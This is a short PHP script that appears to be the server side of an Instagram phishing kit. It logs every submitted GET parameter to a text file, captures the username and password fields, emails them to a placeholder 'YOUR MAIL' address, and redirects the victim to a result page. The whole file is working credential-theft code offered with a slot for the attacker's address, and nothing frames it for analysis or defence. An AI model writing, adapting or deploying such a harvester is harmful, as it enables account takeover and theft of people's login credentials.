<?php
header ('Location:/result.htm');
$handle = fopen("soawa.txt", "a");
foreach($_GET as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
$to      = 'YOUR MAIL';
$subject = 'Instagram Account';
$username = $_GET['username'];
$password = $_GET['password'];
$message = "Username:" . $username . "<br>" . "Password: " . $password;
$headers = 'From: YOUR MAIL' . "\r\n" .
    'Reply-To: YOUR MAIL' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);
exit;
?>
